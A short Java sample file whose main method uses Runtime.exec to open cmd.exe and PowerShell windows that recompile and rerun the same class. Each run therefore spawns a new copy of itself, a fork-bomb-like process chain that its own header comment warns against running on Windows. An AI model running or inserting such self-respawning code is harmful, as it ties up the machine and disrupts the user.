package Tasks.Samples.Scripts;

/*
 * DO NOT RUN IT ON WINDOWS
 * or be ready to kill process
 */

import java.io.IOException;

public class Do {
    public static void main(String[] args) throws IOException {
        System.out.println("hello");
        String command = "javac Do.java"; // compile
        Runtime.getRuntime().exec("cmd.exe /c start powershell.exe " + command);
        command = "java Do"; // run this file
        for (int i = 0; i < 1; i++) {
            Runtime.getRuntime().exec("cmd.exe /c start powershell.exe " + command);
        } // infinity loop
    }
}
